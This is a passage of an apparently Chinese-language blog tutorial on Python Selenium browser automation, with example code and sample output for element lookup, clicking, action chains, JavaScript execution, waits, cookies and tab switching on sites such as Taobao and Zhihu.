class="selector-class">.WebElement</span> (session=<span class="string">"cb088f704736092b306130aab2abf8f1"</span>, element=<span class="string">"4ce8e958-225e-480b-9e43-d0510bd6b7ee"</span>)&gt;, &lt;selenium<span class="selector-class">.webdriver</span><span class="selector-class">.remote</span><span class="selector-class">.webelement</span><span class="selector-class">.WebElement</span> (session=<span class="string">"cb088f704736092b306130aab2abf8f1"</span>, element=<span class="string">"c37b736b-8d99-4424-a38c-f5270bdc274c"</span>)&gt;, &lt;selenium<span class="selector-class">.webdriver</span><span class="selector-class">.remote</span><span class="selector-class">.webelement</span><span class="selector-class">.WebElement</span> (session=<span class="string">"cb088f704736092b306130aab2abf8f1"</span>, element=<span class="string">"a1c19196-5d1e-414b-ae4b-44ad67938651"</span>)&gt;, &lt;selenium<span class="selector-class">.webdriver</span><span class="selector-class">.remote</span><span class="selector-class">.webelement</span><span class="selector-class">.WebElement</span> (session=<span class="string">"cb088f704736092b306130aab2abf8f1"</span>, element=<span class="string">"387c966a-29d2-4ced-a1bf-ae11d24f3252"</span>)&gt;, &lt;selenium<span class="selector-class">.webdriver</span><span class="selector-class">.remote</span><span class="selector-class">.webelement</span><span class="selector-class">.WebElement</span> (session=<span class="string">"cb088f704736092b306130aab2abf8f1"</span>, element=<span class="string">"f74ecd4d-68eb-4be6-b50a-6ad5f792b9af"</span>)&gt;, &lt;selenium<span class="selector-class">.webdriver</span><span class="selector-class">.remote</span><span class="selector-class">.webelement</span><span class="selector-class">.WebElement</span> (session=<span class="string">"cb088f704736092b306130aab2abf8f1"</span>, element=<span class="string">"5c413df1-2c09-4a10-88ee-c27287535d6e"</span>)&gt;, &lt;selenium<span class="selector-class">.webdriver</span><span class="selector-class">.remote</span><span class="selector-class">.webelement</span><span class="selector-class">.WebElement</span> (session=<span class="string">"cb088f704736092b306130aab2abf8f1"</span>, element=<span class="string">"73ee7920-b2dd-44dd-b5b5-97a36b5684e1"</span>)&gt;, &lt;selenium<span class="selector-class">.webdriver</span><span class="selector-class">.remote</span><span class="selector-class">.webelement</span><span class="selector-class">.WebElement</span> (session=<span class="string">"cb088f704736092b306130aab2abf8f1"</span>, element=<span class="string">"5ef053b7-90a1-4a0d-b504-284d8d9ed497"</span>)&gt;, &lt;selenium<span class="selector-class">.webdriver</span><span class="selector-class">.remote</span><span class="selector-class">.webelement</span><span class="selector-class">.WebElement</span> (session=<span class="string">"cb088f704736092b306130aab2abf8f1"</span>, element=<span class="string">"555d8a92-90bd-4724-99ab-fcdb88397077"</span>)&gt;, &lt;selenium<span class="selector-class">.webdriver</span><span class="selector-class">.remote</span><span class="selector-class">.webelement</span><span class="selector-class">.WebElement</span> (session=<span class="string">"cb088f704736092b306130aab2abf8f1"</span>, element=<span class="string">"98329539-7cf1-404a-8903-d3ea72f3bb6d"</span>)&gt;, &lt;selenium<span class="selector-class">.webdriver</span><span class="selector-class">.remote</span><span class="selector-class">.webelement</span><span class="selector-class">.WebElement</span> (session=<span class="string">"cb088f704736092b306130aab2abf8f1"</span>, element=<span class="string">"df6d8c38-5f1d-4872-8a30-d6e0e1ca02ad"</span>)&gt;]</span><br></pre></td></tr></table></figure><br>这样就获取到了所有条目的源代码</p>
<p>获取多个节点<br><figure class="highlight ceylon"><table><tr><td class="code"><pre><span class="line">find<span class="number">_</span>elements<span class="number">_</span><span class="meta">by</span><span class="number">_</span>id</span><br><span class="line">find<span class="number">_</span>elements<span class="number">_</span><span class="meta">by</span><span class="number">_n</span>ame</span><br><span class="line">find<span class="number">_</span>elements<span class="number">_</span><span class="meta">by</span><span class="number">_</span>xpath</span><br><span class="line">find<span class="number">_</span>elementst<span class="number">_</span><span class="meta">by</span><span class="number">_</span>link<span class="number">_</span>text</span><br><span class="line">find<span class="number">_</span>elements<span class="number">_</span><span class="meta">by</span><span class="number">_p</span>artial<span class="number">_</span>link<span class="number">_</span>text</span><br><span class="line">find<span class="number">_</span>elements<span class="number">_</span><span class="meta">by</span><span class="number">_</span>tag<span class="number">_n</span>ame</span><br><span class="line">find<span class="number">_</span>elements<span class="number">_</span><span class="meta">by</span><span class="number">_</span><span class="keyword">class</span><span class="number">_n</span>ame</span><br><span class="line">find<span class="number">_</span>elementst<span class="number">_</span><span class="meta">by</span><span class="number">_</span>css<span class="number">_</span>selector</span><br></pre></td></tr></table></figure></p>
<p>同时还有通用方法<br><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">lis=browser.find<span class="constructor">_elements(By.CSS_SELECTOR,'.<span class="params">service</span>-<span class="params">bd</span> <span class="params">li</span>')</span></span><br></pre></td></tr></table></figure></p>
<h4 id="节点交互"><a href="#节点交互" class="headerlink" title="节点交互"></a>节点交互</h4><p>我们还可以让浏览器执行一些操作，比较常见的如输入文字时用send_keys()方法，清空文字时用clear()方法，点击按钮时用click()方法<br><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">import</span> <span class="type">time</span></span><br><span class="line"></span><br><span class="line">browser=webdriver.Chrome()</span><br><span class="line">browser.<span class="keyword">get</span>(<span class="string">'https://www.taobao.com'</span>)</span><br><span class="line">input=browser.find_element_by_id(<span class="string">'q'</span>)</span><br><span class="line"><span class="keyword">input</span>.send_keys(<span class="string">'iphone'</span>)</span><br><span class="line"><span class="type">time</span>.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">input</span>.clear()</span><br><span class="line"><span class="keyword">input</span>.send_keys(<span class="string">'ipad'</span>)</span><br><span class="line">button=browser.find_element_by_class_name(<span class="string">'btn-search'</span>)</span><br><span class="line">button.click()</span><br></pre></td></tr></table></figure><br>这里首先驱动浏览器打开淘宝，然后用find_element_by_id()方法获取输入框，然后用send_keys()方法输入iphone文字，等待一秒后用clear()方法清空输入框，再次调用send_keys()方法输入ipad文字，之后再用find_element_by_class_name()方法获取搜索按钮，最后调用click()方法完成搜索动作</p>
<p>更多交互请参考文档：<br>中文文档：<br><a href="https://python-selenium-zh.readthedocs.io/zh_CN/latest/" target="_blank" rel="noopener">https://python-selenium-zh.readthedocs.io/zh_CN/latest/</a><br>官方文档：<br><a href="https://selenium-python.readthedocs.io/api.html#module-selenium.webdriver.remote.webelement" target="_blank" rel="noopener">https://selenium-python.readthedocs.io/api.html#module-selenium.webdriver.remote.webelement</a></p>
<h4 id="动作链"><a href="#动作链" class="headerlink" title="动作链"></a>动作链</h4><p>在上面的实例中，发现一些交互动作都是针对某个节点执行的。比如，对于输入框，我们就是调用它的输入文字和清空文字方法，对于按钮，就调用它的点击方法.其次，还有另外一些操作，它们没有特定的执行对象，比如鼠标拖拽，键盘按键等</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver <span class="keyword">import</span> ActionChains</span><br><span class="line"></span><br><span class="line">browser=webdriver.Chrome()</span><br><span class="line">url="http://www.runoob.com/try/try.php?filename=jqueryui-api-droppable"</span><br><span class="line">browser.<span class="keyword">get</span>(url)</span><br><span class="line">browser.switch_to.frame(<span class="string">'iframeResult'</span>)</span><br><span class="line">source = browser.find_element_by_css_selector(<span class="string">'#draggable'</span>)</span><br><span class="line">target = browser.find_element_by_css_selector(<span class="string">'#droppable'</span>)</span><br><span class="line">actions = ActionChains(browser)</span><br><span class="line">actions.drag_and_drop(source , target)</span><br><span class="line">actions.<span class="keyword">perform</span>()</span><br></pre></td></tr></table></figure>
<p>运行后会将小方块拖拽到大方块中<br><img src="/img/python3/selenium4.png" alt="avatar"></p>
<p>更多动作链操作请参考文档：<br>中文文档：<br><a href="https://python-selenium-zh.readthedocs.io/zh_CN/latest/" target="_blank" rel="noopener">https://python-selenium-zh.readthedocs.io/zh_CN/latest/</a><br>官方文档：<br><a href="https://selenium-python.readthedocs.io/api.html#module-selenium.webdriver.remote.webelement" target="_blank" rel="noopener">https://selenium-python.readthedocs.io/api.html#module-selenium.webdriver.remote.webelement</a></p>
<h4 id="执行JavaScript"><a href="#执行JavaScript" class="headerlink" title="执行JavaScript"></a>执行JavaScript</h4><p>对于某些操作，Selenium API并没有提供。比如，下拉进度条，它可以直接模拟运行JavaScript，此时使用execute_script()方法即可实现<br><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">from selenium import webdriver</span><br><span class="line"></span><br><span class="line">browser=webdriver.<span class="constructor">Chrome()</span></span><br><span class="line">browser.get(<span class="string">"https://www.zhihu.com/explore"</span>)</span><br><span class="line">browser.execute<span class="constructor">_script('<span class="params">window</span>.<span class="params">scrollTo</span>(0,<span class="params">document</span>.<span class="params">body</span>.<span class="params">scrollHeight</span>)</span>')</span><br><span class="line">browser.execute<span class="constructor">_script('<span class="params">alert</span>(<span class="string">"To Bottom"</span>)</span>')</span><br></pre></td></tr></table></figure><br><img src="/img/python3/selenium5.png" alt="avatar"><br>这里就利用execute_script()方法将进度条下拉到最底部，然后弹出alert提示框</p>
<p>所以说有了这个方法，基本上API没有提供的所有功能都可以用执行JavaScript的方式来实现了</p>
<h4 id="获取节点信息"><a href="#获取节点信息" class="headerlink" title="获取节点信息"></a>获取节点信息</h4><p>前面通过Beautiful Soup,pyquery等提取信息</p>
<p>Selenium中提供了选择节点的方法，返回的是WebElement类型，那么它也有相关的方法和属性来直接提取节点信息，如属性，文本等。这样的话，我们就可以不用通过解析源代码来提取信息了</p>
<h5 id="获取属性"><a href="#获取属性" class="headerlink" title="获取属性"></a>获取属性</h5><p>我们可以通过get_attribute()方法来获取节点的属性，前提是先选中这个节点<br><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium import webdriver</span><br><span class="line"></span><br><span class="line"><span class="attribute">browser</span>=webdriver.Chrome()</span><br><span class="line"><span class="attribute">url</span>=<span class="string">'https://www.zhihu.com/explore'</span></span><br><span class="line">browser.<span class="builtin-name">get</span>(url)</span><br><span class="line"><span class="attribute">logo</span>=browser.find_element_by_id('zh-top-link-logo')</span><br><span class="line"><span class="builtin-name">print</span>(logo)</span><br><span class="line"><span class="builtin-name">print</span>(logo.get_attribute(<span class="string">'class'</span>))</span><br></pre></td></tr></table></figure><br>通过get_attribute()方法，然后传入想要获取的属性名，就可以得到它的值了</p>
<h5 id="获取文本值"><a href="#获取文本值" class="headerlink" title="获取文本值"></a>获取文本值</h5><p>每个WebElement节点都有text属性，直接调用这个属性就可以得到节点内部的文本信息，这相当于Beautiful Soup中的get_text()方法，pyquery的text()方法<br><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium import webdriver</span><br><span class="line"></span><br><span class="line"><span class="attribute">browser</span>=webdriver.Chrome()</span><br><span class="line"><span class="attribute">url</span>=<span class="string">'https://www.zhihu.com/explore'</span></span><br><span class="line">browser.<span class="builtin-name">get</span>(url)</span><br><span class="line"><span class="attribute">input</span>=browser.find_element_by_class_name('ExploreHomePage-ContentSection-header')</span><br><span class="line"><span class="builtin-name">print</span>(input.text)</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">最新专题</span><br></pre></td></tr></table></figure><br>这样就获得了最新专题节点的内容</p>
<h5 id="获取id-位置，标签名和大小"><a href="#获取id-位置，标签名和大小" class="headerlink" title="获取id,位置，标签名和大小"></a>获取id,位置，标签名和大小</h5><p>WebElement节点还有一些其他的属性，比如id属性可以获取节点的id,location属性可以获取该节点在页面中的相对位置，tag_name属性可以获取标签名称，size属性可以获取节点的大小，也就是宽高<br><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium import webdriver</span><br><span class="line"></span><br><span class="line"><span class="attribute">browser</span>=webdriver.Chrome()</span><br><span class="line"><span class="attribute">url</span>=<span class="string">'https://www.zhihu.com/explore'</span></span><br><span class="line">browser.<span class="builtin-name">get</span>(url)</span><br><span class="line"><span class="attribute">input</span>=browser.find_element_by_class_name('ExploreHomePage-ContentSection-header')</span><br><span class="line"><span class="builtin-name">print</span>(input.text)</span><br><span class="line"><span class="builtin-name">print</span>(input.id)</span><br><span class="line"><span class="builtin-name">print</span>(input.location)</span><br><span class="line"><span class="builtin-name">print</span>(input.tag_name)</span><br><span class="line"><span class="builtin-name">print</span>(input.size)</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">最新专题</span><br><span class="line">b74d780d-b4f2-4a35-9221-cb40a5e48902</span><br><span class="line">&#123;<span class="string">'x'</span>: 10, <span class="string">'y'</span>: 84&#125;</span><br><span class="line">div</span><br><span class="line">&#123;<span class="string">'height'</span>: 36, <span class="string">'width'</span>: 1000&#125;</span><br></pre></td></tr></table></figure><br>这样就获取到了id,位置，标签名和大小</p>
<h4 id="切换Frame"><a href="#切换Frame" class="headerlink" title="切换Frame"></a>切换Frame</h4><p>网页中有一个节点叫做iframe，也就是子Frame，相当于页面中的子页面，它的结构和外部网页的结构完全一致。Selenium打开页面后，它默认是在父级Frame里操作，而此时如果页面中还有子Frame，它是不能获取到子Frame里面的节点的，这时就需要switch_to.frame()方法来切换Frame</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">import time</span><br><span class="line"><span class="keyword">from</span> selenium import webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.common.exceptions import NoSuchElementException</span><br><span class="line"></span><br><span class="line"><span class="attribute">browser</span>=webdriver.Chrome()</span><br><span class="line"><span class="attribute">url</span>=<span class="string">'http://www.runoob.com/try/try.php?filename=jqueryui-api-droppable'</span></span><br><span class="line">browser.<span class="builtin-name">get</span>(url)</span><br><span class="line">browser.switch_to.frame(<span class="string">'iframeResult'</span>)</span><br><span class="line">try:</span><br><span class="line">    <span class="attribute">logo</span>=browser.find_element_by_class_name('logo')</span><br><span class="line">except NoSuchElementException:</span><br><span class="line">    <span class="builtin-name">print</span>(<span class="string">"NO LOGO"</span>)</span><br><span class="line">browser.switch_to.parent_frame()</span><br><span class="line"><span class="attribute">logo</span>=browser.find_element_by_class_name('logo')</span><br><span class="line"><span class="builtin-name">print</span>(logo)</span><br><span class="line"><span class="builtin-name">print</span>(logo.text)</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line"><span class="literal">NO</span> LOGO</span><br><span class="line">&lt;selenium.webdriver.remote.webelement.WebElement (<span class="attribute">session</span>=<span class="string">"74a6a23d440b28de1d52cee1269b0ca6"</span>, <span class="attribute">element</span>=<span class="string">"909ba7c7-467d-4bb7-86aa-3df9d4981362"</span>)&gt;</span><br><span class="line">RUNOOB.COM</span><br></pre></td></tr></table></figure>
<p>首先通过switch_to.frame()方法切换到子Frame里面，然后尝试获取子Frame里的logo节点，如果找不到的话，就会抛出NoSuchElementException异常。接下来，重新切换到父级Frame,再次重新获取节点，就可以成功捕获了</p>
<h4 id="延时等待"><a href="#延时等待" class="headerlink" title="延时等待"></a>延时等待</h4><p>get()方法会在网页框架加载结束后结束执行，此时如果获取page_source,可能并不是浏览器完全加载完成的页面，如果某些页面有额外的Ajax请求，我们在网页源代码中也不一定能获取到。所以，这里需要延时等待一定时间，确保节点已经加载出来</p>
<h5 id="隐式等待"><a href="#隐式等待" class="headerlink" title="隐式等待"></a>隐式等待</h5><p>当使用隐式等待执行测试的时候，如果selenium没有在DOM中找到节点，将继续等待，超出设定时间后，则抛出找不到节点的异常。换句话说，当查找节点而节点并没有立即出现的时候，隐式等待将等待一段时间再查找DOM，默认事件为0<br><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium import webdriver</span><br><span class="line"></span><br><span class="line"><span class="attribute">browser</span>=webdriver.Chrome()</span><br><span class="line">browser.implicitly_wait(10)</span><br><span class="line">browser.<span class="builtin-name">get</span>(<span class="string">'https://www.zhihu.com/explore'</span>)</span><br><span class="line"><span class="attribute">input</span>=browser.find_element_by_class_name('ExploreHomePage-ContentSection-header')</span><br><span class="line"><span class="builtin-name">print</span>(input)</span><br></pre></td></tr></table></figure><br>这里使用了隐式等待implicitly_wait()</p>
<h5 id="显式等待"><a href="#显式等待" class="headerlink" title="显式等待"></a>显式等待</h5><p>隐式等待的效果其实并没有那么好，因为我们只规定了一个固定时间，而页面加载时间还会受到网络条件的影响</p>
<p>这里还有一种更合适的显式等待方法，它指定要查找的节点，然后指定一个最长等待时间。如果在规定时间内加载出来了节点，就返回查找的节点，反之</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium import webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.common.by import By</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.ui import WebDriverWait</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support import expected_conditions as EC</span><br><span class="line"></span><br><span class="line"><span class="attribute">browser</span>=webdriver.Chrome()</span><br><span class="line">browser.<span class="builtin-name">get</span>(<span class="string">'https://www.taobao.com'</span>)</span><br><span class="line"><span class="attribute">wait</span>=WebDriverWait(browser,10)</span><br><span class="line"><span class="attribute">input</span>=wait.until(EC.presence_of_element_located((By.ID,'q')))</span><br><span class="line"><span class="attribute">button</span>=wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR,'.btn-search')))</span><br><span class="line"><span class="builtin-name">print</span>(input,button)</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">&lt;selenium.webdriver.remote.webelement.WebElement (<span class="attribute">session</span>=<span class="string">"8ed44db593e504803b1e1bbdaa40096f"</span>, <span class="attribute">element</span>=<span class="string">"2e6789ed-7862-419b-adca-2cea31a3d3c9"</span>)&gt; &lt;selenium.webdriver.remote.webelement.WebElement (<span class="attribute">session</span>=<span class="string">"8ed44db593e504803b1e1bbdaa40096f"</span>, <span class="attribute">element</span>=<span class="string">"4d2571b6-fd8d-47e2-8490-f6fddf96959b"</span>)&gt;</span><br></pre></td></tr></table></figure>
<p>首先引入WebDriverWait这个对象，指定最长等待时间，然后调用它的until()方法，传入要等待条件expected_conditions。比如，这里传入了presence_of_element_located这个条件，代表节点出现的意思，其参数是节点的定位元组，也就是ID为q的节点搜索框</p>
<p>这样可以做到的效果就是，在10秒内如果ID为q的节点成功加载出来，就返回该节点；如果超过10秒还没有加载出来，就抛出异常。</p>
<p>对于按钮，可以更改一下等待条件，比如改为element_to_be_clickable，也就是可点击，所以查找按钮时查找CSS选择器为.btn-search的按钮，如果10秒内它是可点击的，也就是成功加载出来了，就返回这个按钮节点，反之</p>
<p>更多操作请参考文档<br>中文文档：<br><a href="https://python-selenium-zh.readthedocs.io/zh_CN/latest/" target="_blank" rel="noopener">https://python-selenium-zh.readthedocs.io/zh_CN/latest/</a><br>官方文档：<br><a href="https://selenium-python.readthedocs.io/api.html#module-selenium.webdriver.remote.webelement" target="_blank" rel="noopener">https://selenium-python.readthedocs.io/api.html#module-selenium.webdriver.remote.webelement</a></p>
<h4 id="前进和后退"><a href="#前进和后退" class="headerlink" title="前进和后退"></a>前进和后退</h4><p>平时使用浏览器时都有前进和后退功能，selenium也可以完成这个操作，它使用back()方法后退，使用forward()方法前进。<br><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="type">time</span></span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line">browser=webdriver.Chrome()</span><br><span class="line">browser.<span class="keyword">get</span>(<span class="string">'https://www.baidu.com'</span>)</span><br><span class="line">browser.<span class="keyword">get</span>(<span class="string">'https://www.taobao.com'</span>)</span><br><span class="line">browser.<span class="keyword">get</span>(<span class="string">'https://www.python.org'</span>)</span><br><span class="line">browser.back()</span><br><span class="line"><span class="type">time</span>.sleep(<span class="number">1</span>)</span><br><span class="line">browser.forward()</span><br><span class="line">browser.<span class="keyword">close</span>()</span><br></pre></td></tr></table></figure><br>这样我们连续访问3个页面，然后调用back方法回到第二个页面，接下来再调用forward()方法又可以前进到第三个页面</p>
<h4 id="cookies"><a href="#cookies" class="headerlink" title="cookies"></a>cookies</h4><p>使用selenium，还可以方便地对Cookies进行操作，例如获取，添加，删除Cookies等<br><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium import webdriver</span><br><span class="line"></span><br><span class="line"><span class="attribute">browser</span>=webdriver.Chrome()</span><br><span class="line">browser.<span class="builtin-name">get</span>(<span class="string">'https://www.zhihu.com/explore'</span>)</span><br><span class="line"><span class="builtin-name">print</span>(browser.get_cookies())</span><br><span class="line">browser.add_cookie(&#123;<span class="string">'name'</span>:<span class="string">'name'</span>,<span class="string">'domain'</span>:<span class="string">'www.zhihu.com'</span>,<span class="string">'value'</span>:<span class="string">'germey'</span>&#125;)</span><br><span class="line"><span class="builtin-name">print</span>(browser.get_cookies())</span><br><span class="line">browser.delete_all_cookies()</span><br><span class="line"><span class="builtin-name">print</span>(browser.get_cookies())</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">[&#123;<span class="string">'domain'</span>: <span class="string">'www.zhihu.com'</span>, <span class="string">'httpOnly'</span>: <span class="literal">False</span>, <span class="string">'name'</span>: <span class="string">'KLBRSID'</span>, <span class="string">'path'</span>: <span class="string">'/'</span>, <span class="string">'secure'</span>: <span class="literal">False</span>, <span class="string">'value'</span>: <span class="string">'cdfcc1d45d024a211bb7144f66bda2cf|1587952898|1587952896'</span>&#125;, &#123;<span class="string">'domain'</span>: <span class="string">'.zhihu.com'</span>, <span class="string">'expiry'</span>: 1619488898, <span class="string">'httpOnly'</span>: <span class="literal">False</span>, <span class="string">'name'</span>: <span class="string">'Hm_lvt_98beee57fd2ef70ccdd5ca52b9740c49'</span>, <span class="string">'path'</span>: <span class="string">'/'</span>, <span class="string">'secure'</span>: <span class="literal">False</span>, <span class="string">'value'</span>: <span class="string">'1587952898'</span>&#125;, &#123;<span class="string">'domain'</span>: <span class="string">'.zhihu.com'</span>, <span class="string">'httpOnly'</span>: <span class="literal">False</span>, <span class="string">'name'</span>: <span class="string">'Hm_lpvt_98beee57fd2ef70ccdd5ca52b9740c49'</span>, <span class="string">'path'</span>: <span class="string">'/'</span>, <span class="string">'secure'</span>: <span class="literal">False</span>, <span class="string">'value'</span>: <span class="string">'1587952898'</span>&#125;, &#123;<span class="string">'domain'</span>: <span class="string">'.zhihu.com'</span>, <span class="string">'expiry'</span>: 1682560896.073367, <span class="string">'httpOnly'</span>: <span class="literal">False</span>, <span class="string">'name'</span>: <span class="string">'d_c0'</span>, <span class="string">'path'</span>: <span class="string">'/'</span>, <span class="string">'secure'</span>: <span class="literal">False</span>, <span class="string">'value'</span>: <span class="string">'"AIBbIT5rLhGPTpMVZJCLnmYZXYPvh8AXzpM=|1587952896"'</span>&#125;, &#123;<span class="string">'domain'</span>: <span class="string">'www.zhihu.com'</span>, <span class="string">'httpOnly'</span>: <span class="literal">False</span>, <span class="string">'name'</span>: <span class="string">'SESSIONID'</span>, <span class="string">'path'</span>: <span class="string">'/'</span>, <span class="string">'secure'</span>: <span class="literal">False</span>, <span class="string">'value'</span>: <span class="string">'Ns5jG8TIaSE1aAjeOzckOayn6V6nDAubFTUf1DfCC2H'</span>&#125;, &#123;<span class="string">'domain'</span>: <span class="string">'.zhihu.com'</span>, <span class="string">'httpOnly'</span>: <span class="literal">False</span>, <span class="string">'name'</span>: <span class="string">'_xsrf'</span>, <span class="string">'path'</span>: <span class="string">'/'</span>, <span class="string">'secure'</span>: <span class="literal">False</span>, <span class="string">'value'</span>: <span class="string">'6e9342c2-b0fd-4474-9099-193fef3e5595'</span>&#125;, &#123;<span class="string">'domain'</span>: <span class="string">'.zhihu.com'</span>, <span class="string">'expiry'</span>: 1651024896.073016, <span class="string">'httpOnly'</span>: <span class="literal">False</span>, <span class="string">'name'</span>: <span class="string">'_zap'</span>, <span class="string">'path'</span>: <span class="string">'/'</span>, <span class="string">'secure'</span>: <span class="literal">False</span>, <span class="string">'value'</span>: <span class="string">'2dbb5fb5-9f25-44ae-ac01-5183941f56df'</span>&#125;]</span><br><span class="line"></span><br><span class="line">[&#123;<span class="string">'domain'</span>: <span class="string">'.www.zhihu.com'</span>, <span class="string">'httpOnly'</span>: <span class="literal">False</span>, <span class="string">'name'</span>: <span class="string">'name'</span>, <span class="string">'path'</span>: <span class="string">'/'</span>, <span class="string">'secure'</span>: <span class="literal">True</span>, <span class="string">'value'</span>: <span class="string">'germey'</span>&#125;, &#123;<span class="string">'domain'</span>: <span class="string">'www.zhihu.com'</span>, <span class="string">'httpOnly'</span>: <span class="literal">False</span>, <span class="string">'name'</span>: <span class="string">'KLBRSID'</span>, <span class="string">'path'</span>: <span class="string">'/'</span>, <span class="string">'secure'</span>: <span class="literal">False</span>, <span class="string">'value'</span>: <span class="string">'cdfcc1d45d024a211bb7144f66bda2cf|1587952898|1587952896'</span>&#125;, &#123;<span class="string">'domain'</span>: <span class="string">'.zhihu.com'</span>, <span class="string">'expiry'</span>: 1619488898, <span class="string">'httpOnly'</span>: <span class="literal">False</span>, <span class="string">'name'</span>: <span class="string">'Hm_lvt_98beee57fd2ef70ccdd5ca52b9740c49'</span>, <span class="string">'path'</span>: <span class="string">'/'</span>, <span class="string">'secure'</span>: <span class="literal">False</span>, <span class="string">'value'</span>: <span class="string">'1587952898'</span>&#125;, &#123;<span class="string">'domain'</span>: <span class="string">'.zhihu.com'</span>, <span class="string">'httpOnly'</span>: <span class="literal">False</span>, <span class="string">'name'</span>: <span class="string">'Hm_lpvt_98beee57fd2ef70ccdd5ca52b9740c49'</span>, <span class="string">'path'</span>: <span class="string">'/'</span>, <span class="string">'secure'</span>: <span class="literal">False</span>, <span class="string">'value'</span>: <span class="string">'1587952898'</span>&#125;, &#123;<span class="string">'domain'</span>: <span class="string">'.zhihu.com'</span>, <span class="string">'expiry'</span>: 1682560896.073367, <span class="string">'httpOnly'</span>: <span class="literal">False</span>, <span class="string">'name'</span>: <span class="string">'d_c0'</span>, <span class="string">'path'</span>: <span class="string">'/'</span>, <span class="string">'secure'</span>: <span class="literal">False</span>, <span class="string">'value'</span>: <span class="string">'"AIBbIT5rLhGPTpMVZJCLnmYZXYPvh8AXzpM=|1587952896"'</span>&#125;, &#123;<span class="string">'domain'</span>: <span class="string">'www.zhihu.com'</span>, <span class="string">'httpOnly'</span>: <span class="literal">False</span>, <span class="string">'name'</span>: <span class="string">'SESSIONID'</span>, <span class="string">'path'</span>: <span class="string">'/'</span>, <span class="string">'secure'</span>: <span class="literal">False</span>, <span class="string">'value'</span>: <span class="string">'Ns5jG8TIaSE1aAjeOzckOayn6V6nDAubFTUf1DfCC2H'</span>&#125;, &#123;<span class="string">'domain'</span>: <span class="string">'.zhihu.com'</span>, <span class="string">'httpOnly'</span>: <span class="literal">False</span>, <span class="string">'name'</span>: <span class="string">'_xsrf'</span>, <span class="string">'path'</span>: <span class="string">'/'</span>, <span class="string">'secure'</span>: <span class="literal">False</span>, <span class="string">'value'</span>: <span class="string">'6e9342c2-b0fd-4474-9099-193fef3e5595'</span>&#125;, &#123;<span class="string">'domain'</span>: <span class="string">'.zhihu.com'</span>, <span class="string">'expiry'</span>: 1651024896.073016, <span class="string">'httpOnly'</span>: <span class="literal">False</span>, <span class="string">'name'</span>: <span class="string">'_zap'</span>, <span class="string">'path'</span>: <span class="string">'/'</span>, <span class="string">'secure'</span>: <span class="literal">False</span>, <span class="string">'value'</span>: <span class="string">'2dbb5fb5-9f25-44ae-ac01-5183941f56df'</span>&#125;]</span><br><span class="line"></span><br><span class="line">[]</span><br></pre></td></tr></table></figure><br>可以看到我们添加的cookie被添加到了cookies中</p>
<h4 id="选项卡管理"><a href="#选项卡管理" class="headerlink" title="选项卡管理"></a>选项卡管理</h4><p>访问网页的时候，会开启一个个选项卡。在selenium中，我们可以对选项卡进行操作<br><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">import time</span><br><span class="line"><span class="keyword">from</span> selenium import webdriver</span><br><span class="line"></span><br><span class="line"><span class="attribute">browser</span>=webdriver.Chrome()</span><br><span class="line">browser.<span class="builtin-name">get</span>(<span class="string">'https://www.baidu.com'</span>)</span><br><span class="line">browser.execute_script(<span class="string">'window.open()'</span>)</span><br><span class="line"><span class="builtin-name">print</span>(browser.window_handles)</span><br><span class="line">browser.switch_to.window(browser.window_handles[1])</span><br><span class="line">browser.<span class="builtin-name">get</span>(<span class="string">'https://www.taobao.com'</span>)</span><br><span class="line">time.sleep(1)</span><br><span class="line">browser.switch_to.window(browser.window_handles[0])</span><br><span class="line">browser.<span class="builtin-name">get</span>(<span class="string">'https://python.org'</span>)</span><br></pre></td></tr></table></figure><br>先访问了百度，然后调用了execute_script()方法，这里传入window.open()这个JavaScript语句开启一个选项卡。然后用windows_handles属性获取当前开启地所有选项卡，返回的是选项卡的代码列表。想要切换，只需要使用switch_to.window()方法，其中是选项卡的代号即可。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>1.安装selenium之后，还需要根据浏览器的不同，安装对应的webdriver，例如Chrome的webdriver</p>
<p>2.webdriver需要放在浏览器的根目录中，并且在环境变量中引入，如果在管理员模式下cmd中，输入对应webdriver的名字，有正常显示就表示环境变量成功</p>
<p>3.如果需要通过python来对浏览器进行操作，还需要将对应的webdriver放入到python的根目录下</p>
<p>4.selenium可以操作浏览器自动完成一些操作，所以需要注意一些危险操作，以免操作信息泄露</p>
<p>5.selenium功能强大，可以使用动作链和节点交互功能完成一系列重复性操作，例如抢课等</p>
]]></content>
      <categories>
        <category>日常学习</category>
        <category>Python3开发</category>
        <category>爬虫</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>Python3-2020/4/18-Ajax</title>
    <url>/2020/04/18/Python3-2020-4-18-%E5%91%A8%E6%8A%A58/</url>
